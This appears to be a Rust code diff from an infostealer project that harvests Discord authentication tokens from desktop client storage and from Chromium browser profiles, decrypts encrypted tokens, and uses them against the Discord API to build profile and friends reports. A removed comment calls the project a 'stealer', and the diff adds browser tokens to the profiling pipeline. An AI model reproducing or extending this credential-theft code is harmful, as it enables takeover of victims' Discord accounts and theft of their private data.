@@ -29,13 +29,13 @@ pub fn discord_token_task(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
     ]
 }
 
-// --- Desktop Discord Tokens ---
-
 pub struct DiscordTokenTask {
     roots: Vec<(String, PathBuf)>,
 }
 
 static DISCORD_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> = Lazy::new(OnceCell::new);
+static DISCORD_BROWSER_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> = 
+    Lazy::new(OnceCell::new);
 static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> = 
     Lazy::new(OnceCell::new);
 
@@ -50,7 +50,7 @@ impl DiscordTokenTask {
 fn discord_roots(ctx: &RecoveryContext) -> Vec<(String, PathBuf)> {
     let mut result = Vec::new();
     let roaming = ctx.roaming_data_dir.clone();
-    let local = ctx.local_data_dir.clone(); // Some wrappers use Local
+    let local = ctx.local_data_dir.clone();
 
     let variants = [
         ("Discord", "Discord.exe"),
@@ -67,7 +67,6 @@ fn discord_roots(ctx: &RecoveryContext) -> Vec<(String, PathBuf)> {
         if path.exists() {
             result.push((proc_name.to_string(), path));
         } else {
-            // Check Local for some electron apps
             let path_local = local.join(dir_name);
             if path_local.exists() {
                 result.push((proc_name.to_string(), path_local));
@@ -170,7 +169,6 @@ async fn collect_tokens_for_path(
             }
 
             if let Ok(data) = read_safe(proc_name, &entry.path(), &temp_dir).await {
-                // Scan for both Encrypted and Plaintext tokens
                 if let Ok(mut found) = scan_bytes_for_tokens(&data, master_key.is_some()) {
                     tokens.extend(found.drain());
                 }
@@ -187,7 +185,7 @@ struct DiscordTokenSummary<'a> {
     tokens: &'a [DiscordTokenRecord],
 }
 
-#[derive(Serialize, Clone)] // Added Clone
+#[derive(Serialize, Clone)]
 struct DiscordTokenRecord {
     source: String,
     raw: String,
@@ -205,13 +203,11 @@ async fn gather_discord_token_records(
         match collect_tokens_for_path(proc_name, root).await {
             Ok((master_key, tokens)) if !tokens.is_empty() => {
                 for token in tokens {
-                    // Try to decrypt if it looks encrypted
                     let decrypted = if token.starts_with("dQw4w9WgXcQ:") {
                          master_key
                             .as_deref()
                             .and_then(|key| decrypt_discord_token(&token, key).ok())
                     } else {
-                        // Plaintext token (Browser or old)
                         Some(token.clone())
                     };
 
@@ -223,7 +219,7 @@ async fn gather_discord_token_records(
                     });
                 }
             }
-            Ok(_) => {} // No tokens found, do nothing
+            Ok(_) => {}
             Err(err) => {
                 records.push(DiscordTokenRecord {
                     source: source_label.clone(),
@@ -241,7 +237,6 @@ async fn gather_discord_token_records(
 fn scan_bytes_for_tokens(buffer: &[u8], look_for_encrypted: bool) -> Result<HashSet<String>, RecoveryError> {
     let mut tokens = HashSet::new();
 
-    // 1. Encrypted Tokens (dQw4w9WgXcQ:)
     if look_for_encrypted {
         let prefix_str = "dQw4w9WgXcQ:";
         let prefix = prefix_str.as_bytes();
@@ -249,8 +244,7 @@ fn scan_bytes_for_tokens(buffer: &[u8], look_for_encrypted: bool) -> Result<Hash
 
         while cursor + prefix.len() <= buffer.len() {
             if &buffer[cursor..cursor + prefix.len()] == prefix {
-                let search_start = cursor; // Include prefix
-                // Find closing quote
+                let search_start = cursor;
                 if let Some(rel_end) = buffer[search_start..].iter().position(|&b| b == b'"') {
                     let end = search_start + rel_end;
                     if let Ok(token) = std::str::from_utf8(&buffer[cursor..end]) {
@@ -258,7 +252,7 @@ fn scan_bytes_for_tokens(buffer: &[u8], look_for_encrypted: bool) -> Result<Hash
                     }
                     cursor = end + 1;
                 } else {
-                    break; // No closing quote found
+                    break;
                 }
             } else {
                 cursor += 1;
@@ -266,13 +260,10 @@ fn scan_bytes_for_tokens(buffer: &[u8], look_for_encrypted: bool) -> Result<Hash
         }
     }
 
-    // 2. Plaintext Regex Tokens (Browser / Legacy / MFA)
-    // Regular: 24.6.27 chars
     let regex_normal = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").unwrap();
-    // MFA: mfa.84 chars
     let regex_mfa = Regex::new(r"mfa\.[\w-]{84}").unwrap();
 
-    if let Ok(text) = std::str::from_utf8(buffer) { // Only safe utf8
+    if let Ok(text) = std::str::from_utf8(buffer) {
          for caps in regex_normal.captures_iter(text) {
              tokens.insert(caps[0].to_string());
          }
@@ -362,13 +353,6 @@ async fn cached_discord_tokens(
     roots: &[(String, PathBuf)]
 ) -> Result<Arc<Vec<DiscordTokenRecord>>, RecoveryError> {
     let roots = roots.to_vec();
-    
-    // We append the browser tokens to the cache if not already present, 
-    // but the cache logic here is a bit tricky with multiple tasks.
-    // Simpler: Just rely on the cache being populated by whoever calls first, 
-    // but here we are only caching Desktop tokens.
-    // The Browser task will manage its own list.
-    
     let cached = DISCORD_TOKEN_CACHE
         .get_or_try_init(|| async move {
             let records = gather_discord_token_records(&roots).await?;
@@ -406,8 +390,6 @@ impl RecoveryTask for DiscordTokenTask {
     }
 }
 
-// --- Browser Discord Tokens ---
-
 struct BrowserDiscordTask {
     local_app_data: PathBuf,
 }
@@ -429,6 +411,80 @@ const BROWSER_PATHS: &[(&str, &str)] = &[
     ("Vivaldi", "Vivaldi\\User Data"),
 ];
 
+async fn gather_browser_discord_tokens(
+    local_app_data: &Path
+) -> Result<Vec<DiscordTokenRecord>, RecoveryError> {
+    let mut records = Vec::new();
+    let temp_dir = std::env::temp_dir().join("ixodes_discord_browser_tmp");
+    let _ = fs::create_dir_all(&temp_dir).await;
+
+    for (browser_name, relative_path) in BROWSER_PATHS {
+        let user_data = local_app_data.join(relative_path);
+        if !user_data.exists() {
+            continue;
+        }
+
+        let mut profiles = vec![user_data.join("Default")];
+        if let Ok(mut entries) = fs::read_dir(&user_data).await {
+            while let Ok(Some(entry)) = entries.next_entry().await {
+                if let Ok(name) = entry.file_name().into_string() {
+                    if name.starts_with("Profile") {
+                        profiles.push(entry.path());
+                    }
+                }
+            }
+        }
+
+        for profile in profiles {
+            let leveldb = profile.join("Local Storage").join("leveldb");
+            if !leveldb.exists() {
+                continue;
+            }
+
+            let mut tokens = HashSet::new();
+            if let Ok(mut dir) = fs::read_dir(&leveldb).await {
+                while let Ok(Some(entry)) = dir.next_entry().await {
+                    let path = entry.path();
+                    if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
+                        if ext == "ldb" || ext == "log" {
+                            if let Ok(data) = read_safe("browser", &path, &temp_dir).await {
+                                if let Ok(mut found) = scan_bytes_for_tokens(&data, false) {
+                                    tokens.extend(found.drain());
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            for token in tokens {
+                records.push(DiscordTokenRecord {
+                    source: format!("{} - {}", browser_name, profile.display()),
+                    raw: token.clone(),
+                    decrypted: Some(token),
+                    error: None,
+                });
+            }
+        }
+    }
+
+    let _ = fs::remove_dir_all(&temp_dir).await;
+    Ok(records)
+}
+
+async fn cached_browser_discord_tokens(
+    local_app_data: &Path,
+) -> Result<Arc<Vec<DiscordTokenRecord>>, RecoveryError> {
+    let local_app_data = local_app_data.to_path_buf();
+    let cached = DISCORD_BROWSER_TOKEN_CACHE
+        .get_or_try_init(|| async move {
+            let records = gather_browser_discord_tokens(&local_app_data).await?;
+            Ok::<Arc<Vec<DiscordTokenRecord>>, RecoveryError>(Arc::new(records))
+        })
+        .await?;
+    Ok(Arc::clone(cached))
+}
+
 #[async_trait]
 impl RecoveryTask for BrowserDiscordTask {
     fn label(&self) -> String {
@@ -440,66 +496,15 @@ impl RecoveryTask for BrowserDiscordTask {
     }
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-         let mut records = Vec::new();
-         let temp_dir = std::env::temp_dir().join("ixodes_discord_browser_tmp");
-         let _ = fs::create_dir_all(&temp_dir).await;
+        let records = cached_browser_discord_tokens(&self.local_app_data).await?;
 
-         for (browser_name, relative_path) in BROWSER_PATHS {
-            let user_data = self.local_app_data.join(relative_path);
-            if !user_data.exists() { continue; }
-
-            let mut profiles = vec![user_data.join("Default")];
-            if let Ok(mut entries) = fs::read_dir(&user_data).await {
-                while let Ok(Some(entry)) = entries.next_entry().await {
-                    if let Ok(name) = entry.file_name().into_string() {
-                        if name.starts_with("Profile") {
-                            profiles.push(entry.path());
-                        }
-                    }
-                }
-            }
-
-            for profile in profiles {
-                let leveldb = profile.join("Local Storage").join("leveldb");
-                if !leveldb.exists() { continue; }
-                
-                let mut tokens = HashSet::new();
-                 if let Ok(mut dir) = fs::read_dir(&leveldb).await {
-                    while let Ok(Some(entry)) = dir.next_entry().await {
-                        let path = entry.path();
-                        if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
-                            if ext == "ldb" || ext == "log" {
-                                if let Ok(data) = read_safe("browser", &path, &temp_dir).await {
-                                    // Browser tokens are rarely encrypted with DPAPI, usually just regex
-                                    if let Ok(found) = scan_bytes_for_tokens(&data, false) {
-                                        tokens.extend(found);
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-                
-                for token in tokens {
-                     records.push(DiscordTokenRecord {
-                        source: format!("{} - {}", browser_name, profile.display()),
-                        raw: token.clone(),
-                        decrypted: Some(token), // Treat as already usable
-                        error: None,
-                    });
-                }
-            }
-         }
-         
-         let _ = fs::remove_dir_all(&temp_dir).await;
-
-         let artifact = write_json_artifact(
+        let artifact = write_json_artifact(
             ctx,
             self.category(),
             &self.label(),
             "discord-tokens-browser.json",
             &DiscordTokenSummary {
-                tokens: &records,
+                tokens: records.as_ref(),
             },
         )
         .await?;
@@ -508,23 +513,20 @@ impl RecoveryTask for BrowserDiscordTask {
     }
 }
 
-
-// --- Profile & Service ---
-
 pub fn discord_profile_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
     Arc::new(DiscordProfileTask::new(ctx))
 }
 
 pub struct DiscordProfileTask {
     roots: Vec<(String, PathBuf)>,
-    // We also need access to browser tokens, but they aren't cached in the same global yet.
-    // For now, we only profile Desktop tokens. In a real top-tier stealer, we'd merge them.
+    local_app_data: PathBuf,
 }
 
 impl DiscordProfileTask {
     pub fn new(ctx: &RecoveryContext) -> Self {
         Self {
             roots: discord_roots(ctx),
+            local_app_data: ctx.local_data_dir.clone(),
         }
     }
 }
@@ -673,11 +675,14 @@ impl DiscordApiClient {
 
 async fn collect_discord_profiles_inner(
     roots: &[(String, PathBuf)],
+    local_app_data: &Path,
     api: &DiscordApiClient,
 ) -> Result<Vec<DiscordProfileRecord>, RecoveryError> {
     let mut profiles = Vec::new();
     let mut seen = HashSet::new();
-    let tokens = cached_discord_tokens(roots).await?;
+    let mut tokens = cached_discord_tokens(roots).await?.as_ref().clone();
+    tokens.extend(cached_browser_discord_tokens(local_app_data).await?.as_ref().clone());
+
     for record in tokens.iter().filter_map(|rec| {
         rec.decrypted
             .as_ref()
@@ -705,13 +710,15 @@ async fn collect_discord_profiles_inner(
 }
 
 async fn cached_discord_profiles(
-    roots: &[(String, PathBuf)]
+    roots: &[(String, PathBuf)],
+    local_app_data: &Path,
 ) -> Result<Arc<Vec<DiscordProfileRecord>>, RecoveryError> {
     let roots = roots.to_vec();
+    let local_app_data = local_app_data.to_path_buf();
     let cached = DISCORD_PROFILE_CACHE
         .get_or_try_init(|| async move {
             let api = DiscordApiClient::new()?;
-            let profiles = collect_discord_profiles_inner(&roots, &api).await?;
+            let profiles = collect_discord_profiles_inner(&roots, &local_app_data, &api).await?;
             Ok::<Arc<Vec<DiscordProfileRecord>>, RecoveryError>(Arc::new(profiles))
         })
         .await?;
@@ -922,7 +929,7 @@ impl RecoveryTask for DiscordProfileTask {
     }
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-        let profiles = cached_discord_profiles(&self.roots).await?;
+        let profiles = cached_discord_profiles(&self.roots, &self.local_app_data).await?;
 
         let artifact = write_json_artifact(
             ctx,
@@ -945,12 +952,14 @@ pub fn discord_service_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
 
 struct DiscordServiceTask {
     roots: Vec<(String, PathBuf)>,
+    local_app_data: PathBuf,
 }
 
 impl DiscordServiceTask {
     fn new(ctx: &RecoveryContext) -> Self {
         Self {
             roots: discord_roots(ctx),
+            local_app_data: ctx.local_data_dir.clone(),
         }
     }
 }
@@ -966,7 +975,7 @@ impl RecoveryTask for DiscordServiceTask {
     }
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
-        let profiles = cached_discord_profiles(&self.roots).await?;
+        let profiles = cached_discord_profiles(&self.roots, &self.local_app_data).await?;
 
         let mut user_builder = String::new();
         let mut friends_builder = format!("Friends:\n====================\n\n");
